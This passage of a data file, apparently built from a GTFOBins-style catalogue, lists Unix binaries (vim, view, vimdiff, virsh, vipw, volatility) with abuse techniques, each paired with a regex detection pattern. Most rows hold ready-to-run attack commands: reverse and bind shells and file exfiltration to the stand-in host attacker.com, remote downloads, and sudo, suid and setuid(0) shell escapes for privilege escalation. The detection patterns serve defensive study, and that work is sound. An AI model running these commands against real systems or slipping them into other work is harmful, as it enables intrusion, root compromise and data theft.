r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))
vim.command("":q!"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via ""d"" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file."
view,file-upload,"export LPORT=8888
view -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()
vim.command("":q!"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.
view,file-upload,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
view -c ':lua local f=io.open(os.getenv(""LFILE""), 'rb')
local d=f:read(""*a"")
io.close(f);
local s=require(""socket"");
local t=assert(s.tcp());
t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
t:send(d);
t:close();'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Send a local file via TCP. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file. This requires that `view` is compiled with Lua support and that `lua-socket` is installed."
view,file-download,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
view -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])
vim.command("":q!"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.
view,file-download,"export LPORT=12345
export LFILE=file_to_save
view -c ':lua local k=require(""socket"");
local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
local c=s:accept();
local d,x=c:receive(""*a"");
c:close();
local f=io.open(os.getenv(""LFILE""), ""wb"");
f:write(d);
io.close(f);'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Fetch a remote file via TCP. Run `nc target.com 12345 < ""file_to_send""` on the attacker box to send the file. This requires that `view` is compiled with Lua support and that `lua-socket` is installed."
view,file-write,"view file_to_write
iDATA
^[
w!",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?view\s+.+),
view,file-read,view file_to_read,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?view\s+.+),
view,library-load,"view -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(""lib.so""); vim.command("":q!"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+(?:\bimport\b)),This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.
view,suid,"./view -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-pc"", ""reset; exec sh -p"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s*\-p\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b)),This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.
view,sudo,sudo view -c ':!/bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+(?:/bin/(?:sh|bash))),
view,sudo,"sudo view -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b)),This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.
view,sudo,"sudo view -c ':lua os.execute(""reset; exec sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+.+),This requires that `view` is compiled with Lua support.
view,capabilities,"./view -c ':py import os; os.setuid(0); os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b)),This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.
view,limited-suid,"./view -c ':lua os.execute(""reset; exec sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+.+),This requires that `view` is compiled with Lua support.
vigr,suid,./vigr,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vigr\s+.+),
vigr,sudo,sudo vigr,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vigr\s+.+),
vim,shell,vim -c ':!/bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+(?:/bin/(?:sh|bash))),
vim,shell,vim --cmd ':set shell=/bin/sh|:shell',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-\-cmd\s+(?:/bin/(?:sh|bash))),
vim,shell,"vim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b)),This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.
vim,shell,"vim -c ':lua os.execute(""reset; exec sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+.+),This requires that `vim` is compiled with Lua support.
vim,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
vim -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")
vim.command("":q!"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
vim,non-interactive-reverse-shell,"export RHOST=attacker.com
export RPORT=12345
vim -c ':lua local s=require(""socket""); local t=assert(s.tcp());
t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
while true do
local r,x=t:receive();local f=assert(io.popen(r,""r""));
local b=assert(f:read(""*a""));t:send(b);
end;
f:close();t:close();'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.
vim,non-interactive-bind-shell,"export LPORT=12345
vim -c ':lua local k=require(""socket"");
local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
local c=s:accept();
while true do
local r,x=c:receive();local f=assert(io.popen(r,""r""));
local b=assert(f:read(""*a""));c:send(b);
end;c:close();f:close();'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.
vim,file-upload,"export URL=http://attacker.com/
export LFILE=file_to_send
vim -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))
vim.command("":q!"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via ""d"" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file."
vim,file-upload,"export LPORT=8888
vim -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()
vim.command("":q!"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.
vim,file-upload,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
vim -c ':lua local f=io.open(os.getenv(""LFILE""), 'rb')
local d=f:read(""*a"")
io.close(f);
local s=require(""socket"");
local t=assert(s.tcp());
t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
t:send(d);
t:close();'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Send a local file via TCP. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed."
vim,file-download,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
vim -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])
vim.command("":q!"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.
vim,file-download,"export LPORT=12345
export LFILE=file_to_save
vim -c ':lua local k=require(""socket"");
local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
local c=s:accept();
local d,x=c:receive(""*a"");
c:close();
local f=io.open(os.getenv(""LFILE""), ""wb"");
f:write(d);
io.close(f);'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Fetch a remote file via TCP. Run `nc target.com 12345 < ""file_to_send""` on the attacker box to send the file. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed."
vim,file-write,"vim file_to_write
iDATA
^[
w",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vim\s+.+),
vim,file-read,vim file_to_read,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vim\s+.+),
vim,library-load,"vim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(""lib.so""); vim.command("":q!"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+(?:\bimport\b)),This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.
vim,suid,"./vim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-pc"", ""reset; exec sh -p"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s*\-p\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b)),This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.
vim,sudo,sudo vim -c ':!/bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+(?:/bin/(?:sh|bash))),
vim,sudo,"sudo vim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b)),This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.
vim,sudo,"sudo vim -c ':lua os.execute(""reset; exec sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+.+),This requires that `vim` is compiled with Lua support.
vim,capabilities,"./vim -c ':py import os; os.setuid(0); os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b)),This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.
vim,limited-suid,"./vim -c ':lua os.execute(""reset; exec sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vim\s*\-c\s+.+),This requires that `vim` is compiled with Lua support.
vimdiff,shell,vimdiff -c ':!/bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+(?:/bin/(?:sh|bash))),
vimdiff,shell,"vimdiff
:set shell=/bin/sh
:shell",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s+(?:/bin/(?:sh|bash))),
vimdiff,shell,"vimdiff -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b)),This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.
vimdiff,shell,"vimdiff -c ':lua os.execute(""reset; exec sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+.+),This requires that `vimdiff` is compiled with Lua support.
vimdiff,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
vimdiff -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")
vim.command("":q!"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
vimdiff,non-interactive-reverse-shell,"export RHOST=attacker.com
export RPORT=12345
vimdiff -c ':lua local s=require(""socket""); local t=assert(s.tcp());
t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
while true do
local r,x=t:receive();local f=assert(io.popen(r,""r""));
local b=assert(f:read(""*a""));t:send(b);
end;
f:close();t:close();'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.
vimdiff,non-interactive-bind-shell,"export LPORT=12345
vimdiff -c ':lua local k=require(""socket"");
local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
local c=s:accept();
while true do
local r,x=c:receive();local f=assert(io.popen(r,""r""));
local b=assert(f:read(""*a""));c:send(b);
end;c:close();f:close();'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.
vimdiff,file-upload,"export URL=http://attacker.com/
export LFILE=file_to_send
vimdiff -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))
vim.command("":q!"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via ""d"" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file."
vimdiff,file-upload,"export LPORT=8888
vimdiff -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()
vim.command("":q!"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.
vimdiff,file-upload,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
vimdiff -c ':lua local f=io.open(os.getenv(""LFILE""), 'rb')
local d=f:read(""*a"")
io.close(f);
local s=require(""socket"");
local t=assert(s.tcp());
t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
t:send(d);
t:close();'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Send a local file via TCP. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed."
vimdiff,file-download,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
vimdiff -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])
vim.command("":q!"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.
vimdiff,file-download,"export LPORT=12345
export LFILE=file_to_save
vimdiff -c ':lua local k=require(""socket"");
local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
local c=s:accept();
local d,x=c:receive(""*a"");
c:close();
local f=io.open(os.getenv(""LFILE""), ""wb"");
f:write(d);
io.close(f);'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Fetch a remote file via TCP. Run `nc target.com 12345 < ""file_to_send""` on the attacker box to send the file. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed."
vimdiff,file-write,"vimdiff file_to_write
iDATA
^[
w",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s+.+),
vimdiff,file-read,vimdiff file_to_read,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s+.+),
vimdiff,library-load,"vimdiff -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(""lib.so""); vim.command("":q!"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+(?:\bimport\b)),This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.
vimdiff,suid,"./vimdiff -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-pc"", ""reset; exec sh -p"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s*\-p\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b)),This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.
vimdiff,sudo,sudo vimdiff -c ':!/bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+(?:/bin/(?:sh|bash))),
vimdiff,sudo,"sudo vimdiff -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b)),This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.
vimdiff,sudo,"sudo vimdiff -c ':lua os.execute(""reset; exec sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+.+),This requires that `vimdiff` is compiled with Lua support.
vimdiff,capabilities,"./vimdiff -c ':py import os; os.setuid(0); os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b)),This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.
vimdiff,limited-suid,"./vimdiff -c ':lua os.execute(""reset; exec sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vimdiff\s*\-c\s+.+),This requires that `vimdiff` is compiled with Lua support.
vipw,suid,./vipw,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vipw\s+.+),
vipw,sudo,sudo vipw,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?vipw\s+.+),
virsh,sudo,"cat > $TF << EOF
<domain type='kvm'>
<name>x</name>
<os>
<type arch='x86_64'>hvm</type>
</os>
<memory unit='KiB'>1</memory>
<devices>
<interface type='ethernet'>
<script path='$SCRIPT'/>
</interface>
</devices>
</domain>
EOF
sudo virsh -c qemu:///system create $TF
virsh -c qemu:///system destroy x","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?virsh\s*\-c\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
virsh,file-write,"echo 'data' > data_to_write
TF=$(mktemp)
cat > $TF <<EOF
<volume type='file'>
<name>y</name>
<key>$LFILE_DIR/$LFILE_NAME</key>
<source>
</source>
<capacity unit='bytes'>5</capacity>
<allocation unit='bytes'>4096</allocation>
<physical unit='bytes'>5</physical>
<target>
<path>$LFILE_DIR/$LFILE_NAME</path>
<format type='raw'/>
<permissions>
<mode>0600</mode>
<owner>0</owner>
<group>0</group>
</permissions>
</target>
</volume>
EOF
virsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR
virsh -c qemu:///system vol-create --pool x --file $TF
virsh -c qemu:///system vol-upload --pool x $LFILE_DIR/$LFILE_NAME data_to_write
virsh -c qemu:///system pool-destroy x","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?virsh\s*\-c\s*\-\-target\s*\-c\s*\-\-pool\s*\-\-file\s*\-c\s*\-\-pool\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","This requires the user to be in the `libvirt` group to perform privileged file write. If the target directory doesn't exist, `pool-create-as` must be run with the `--build` option. The destination file ownership and permissions can be set in the XML."
virsh,file-read,"virsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR
virsh -c qemu:///system vol-download --pool x $LFILE_NAME $SPATH
virsh -c qemu:///system pool-destroy x","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?virsh\s*\-c\s*\-\-target\s*\-c\s*\-\-pool\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This requires the user to be in the `libvirt` group to perform privileged file read.
volatility,shell,"volatility -f file.dump volshell
__import__('os').system('/bin/sh')","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?volatility\s*\-f\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)))",
